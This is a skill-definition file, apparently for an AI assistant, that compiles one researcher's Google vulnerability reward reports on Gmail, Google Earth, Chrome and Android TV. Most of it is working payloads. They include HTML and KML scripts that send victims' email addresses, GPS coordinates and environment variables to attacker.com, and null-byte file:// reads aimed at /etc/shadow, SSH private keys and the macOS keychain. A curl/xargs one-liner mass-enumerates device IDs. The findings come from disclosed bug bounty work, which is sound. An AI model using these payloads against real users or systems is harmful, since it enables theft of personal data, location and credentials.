---
name: google-bughunters-mobile
description: Personal Google VRP reports by omespino — mobile app and desktop client findings. Gmail Android content:// URI email exfiltration (document.location path contains victim email, JS extracts it); XSS in Google Earth iOS app via KML CDATA onerror (navigator.geolocation exfiltration via broken img src); XSS + LFI in Google Earth Pro Linux via KML CDATA script src with relative path traversal (file:../../../etc/environment loaded as JS); Arbitrary file read in Google Earth Pro macOS via null byte bypass in Add Link UI (file:///etc/passwd%00.html); Local file read via Chrome file:// (file:///etc/environment has JS-compatible VAR="value" syntax → variables in global scope); No rate limit + IDOR sequential on Android TV setup/lookup endpoint (seq + xargs parallel enumeration of device IDs); XSS via PowerPoint 97-2003 javascript: hyperlink in Gmail iOS app and Google Drive iOS app; Mobile Harness Lab Server LFI as root on 100.x.x.x range. Use alongside google-bughunters-cloud. Spanish triggers — "gmail android", "google earth kml", "earth ios", "earth pro linux", "earth pro macos", "chrome file://", "android tv idor", "powerpoint xss ios", "gmail ios drive ios", "mobile harness lab", "mis reportes google mobile".
---

## Personal Google VRP — Mobile / Desktop App Findings (omespino)

Use alongside `google-bughunters-cloud`.

---

### 19. Gmail email address exfiltration via HTML attachment — Android content:// URI leak
**Target:** Gmail Android + Chrome Android | **Versions:** Gmail 2020.09.06, Chrome 85.0.4183.127

**Why it works:**
- Gmail Android opens HTML attachments in Chrome via Android content:// provider URI
- The URI contains the user's email in the path: `content://com.google.android.gm.sapi/<email>/message_attachment_external/...`
- JavaScript reads `document.location` → extracts email from position [3] of the path

**Malicious HTML attachment:**
```html
<script>
  let email = document.location.toString().split('/')[3];
  document.write('<h2>Email: ' + email + '</h2>');
  fetch("http://attacker.com/?victim_email=" + email);
</script>
```

**Exposed URI format:**
```
content://com.google.android.gm.sapi/<EMAIL>/message_attachment_external/<thread-id>/<msg-id>/0.1
                                       ↑
                                  email at position [3]
```

**Attack chain:**
1. Attacker sends email with `gmail_exfil.html` as attachment
2. Victim opens attachment → Chrome Android loads it with the content:// URI
3. JS extracts email → `fetch()` to attacker server
4. Attacker receives: `?victim_email=victim@gmail.com`

**Generalized technique:** Android content providers (Gmail, Drive, Photos) use URIs that may contain sensitive data in the path. Apps passing these URIs to webviews or external browsers can leak that info to JS. Look for `document.location` and `document.referrer` in webviews opened from content providers.

---

### 13. XSS in Google Earth iOS app via KML — exfiltration of precise geolocation
**Target:** Google Earth iOS App v9.134.0 | **Delivery:** Google Drive link → "Open with Google Earth"

**KML payload (CDATA with onerror on broken img src):**
```xml
<description><![CDATA[
  <img onerror='{
    navigator.geolocation.getCurrentPosition(function(position) {
      document.write("Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude);
      document.write("<img src=http://attacker.com/?" + position.coords.latitude + "," + position.coords.longitude + ">");
    });
  }' src="./2.htm">
]]></description>
```

**Why `onerror` works:** `src="./2.htm"` is a relative path that doesn't exist → embedded browser fires `onerror`. In maps apps, users already expect location prompts → accepts without suspicion.

**Full attack chain:**
1. Attacker creates malicious KML → uploads to Google Drive → shares link
2. Victim clicks Drive link → "Open with Google Earth"
3. Victim clicks the marker → description renders → XSS fires
4. App requests location (expected behavior) → victim accepts
5. Precise GPS coordinates exfiltrated to attacker server

**XSS trigger comparison across KML reports:**
| Technique | Event | Interaction needed |
|---|---|---|
| `<script src="file:///etc/environment">` | Automatic on load | No |
| `<img onerror='...' src="./broken">` | Automatic (broken src) | No |
| `javascript:prompt()` hyperlink in .doc/.ppt | User click | Yes |
| `<svg onload='...'>` | Automatic on render | No |

---

### 11. XSS + LFI in Google Earth Pro via KML — /etc/environment disclosure with relative path traversal
**Target:** Google Earth Pro Desktop 7.3.4.8284 (Linux) | **OS:** Ubuntu 20.04

**Malicious KML payload:**
```xml
<Placemark>
  <name>placemark</name>
  <description><![CDATA[
    <script src="file:../../../../../../../etc/environment"></script>
    <script>
      document.write('PATH var = ' + PATH);
      document.write('JAVA_HOME var = ' + JAVA_HOME);
      document.write('<img src="http://attacker.com/?path=' + PATH + '&java_home=' + JAVA_HOME + '">');
    </script>
  ]]></description>
</Placemark>
```

**Key difference vs Chrome report:** relative path traversal `file:../../../../../../../etc/environment` from the KML file location — Google Earth's embedded browser allows this; Chrome uses absolute `file:///etc/environment`.

**Attack flow:**
1. Victim receives/downloads the `.kml` file
2. Double-click → Google Earth Pro opens automatically
3. Victim clicks on the placemark → description renders
4. XSS loads `/etc/environment`, exfiltrates `PATH`, `JAVA_HOME` etc. to attacker server

**Generalization:** Desktop apps with embedded browsers (Electron, WebKit, CEF) often have `file://` access without modern browser restrictions. Test file formats that render HTML: `.kml`, `.gpx`, `.svg`, map files, rich documents.

---

### 14. Arbitrary file read via null byte (%00) in Google Earth Pro macOS — from the UI
**Target:** Google Earth Pro Desktop 7.3.3.7786 (macOS)

**Payload in "Add Link" field when creating a Pin:**
```
<a href="file:///etc/passwd%00.html">passwd</a>
```

**Why null byte works:** `%00` terminates the string at OS level → OS reads `/etc/passwd` and stops; the `.html` extension is only there to pass the app's extension filter. App verifies `.html` → accepts; OS opens the real file.

**Exploitation steps (from the UI):**
1. Open Google Earth Pro → create a new Pin
2. In "Add Link" field paste: `<a href="file:///etc/passwd%00.html">text</a>`
3. Click the hyperlink in the left "Places" panel
4. Contents of `/etc/passwd` displayed directly

**More targets:**
```
file:///etc/shadow%00.jpg
file:///home/user/.ssh/id_rsa%00.png
file:///Users/user/Library/Keychains/login.keychain%00.html   # macOS
```

**Google Earth vector comparison:**
| Report | Platform | Vector | Technique |
|---|---|---|---|
| KML CDATA + script src | Desktop Linux | External KML | Relative path-traversal LFI |
| KML CDATA + onerror | iOS | KML via Drive | XSS + geolocation |
| Pin "Add Link" + %00 | Desktop macOS | App native UI | Null byte bypass in file:// |

---

### 10. Local file read via Chrome — /etc/environment as valid JavaScript
**Target:** Google Chrome 92.0.4515.159 (Linux) | **OS:** Ubuntu 20.04

**Why it works:** `/etc/environment` has JS-compatible format (`VAR="value"`) — Chrome loads it as a script from file:// and variables become accessible in the global scope.

**Malicious HTML:**
```html
<script src="file:///etc/environment"></script>
<img src="http://attacker.com/?path=" + PATH>
<img src="http://attacker.com/?java=" + JAVA_HOME>
```

**Exfiltration via netcat:**
```bash
sudo nc -l -p 80
```

**Other Linux files with JS-compatible format:** `~/.bashrc`, `/etc/profile`, app config files with `KEY="value"` or `KEY=value` syntax.

**Requirement:** victim opens malicious HTML locally in Chrome (delivery: phishing, USB drop, email attachment).

---

### 15. No rate limit + IDOR sequential — mass enumeration of Android TV device IDs
**Target:** `https://www.android.com/tv/setup/lookup?dc={}`

**One-liner enumeration:**
```bash
time seq -w 0 009999 | xargs -I {} -P20 curl -s \
  "https://www.android.com/tv/setup/lookup?dc={}" \
  | tr '&' '\n' | grep device | tee android_tvs_scrapped.txt
```
- `-P20` → 20 parallel requests
- ~900 devices in ~3 minutes (9% hit rate at 10K range)

**Scalability:**
| Requests | Estimated devices | Approx time |
|---|---|---|
| 10,000 | ~900 | 3 min |
| 100,000 | ~9,000 | 30 min |
| 1,000,000 | ~90,000 | ~5 hrs |

**Indicators of enumerable endpoints:**
- Single-field numeric parameters in setup/lookup URLs
- Zero-padded codes (`0001`, `0002`...) → finite and predictable range
- No rate limit on responses that vary between "found" and "not found"

---

### 5. XSS via PowerPoint 97-2003 in Gmail iOS app and Google Drive iOS app
**Target:** Gmail iOS v5.0.180121, Google Drive iOS v4.2018.05202 | **Platform:** iPhone 6, iOS 11.2.5

**Technique:** `.ppt` file with hyperlink to `javascript:prompt(document.domain)` — must be saved as **PowerPoint 97-2003 (.ppt)**, not .pptx.

**Gmail vector:** open `.ppt` attachment in Gmail iOS → click hyperlink → XSS.
**Drive vector:** copy attachment to Drive from email view → open in Drive iOS → click hyperlink → XSS.

**Confirmed pattern across multiple platforms:**
| Target | Format | Status |
|---|---|---|
| Atlassian Confluence | Word 97-2003 (.doc) | Resolved $300 |
| Gmail iOS app | PowerPoint 97-2003 (.ppt) | Google VRP |
| Google Drive iOS app | PowerPoint 97-2003 (.ppt) | Google VRP |

**Payload:** `javascript:prompt(document.domain)` as hyperlink URL in the document.
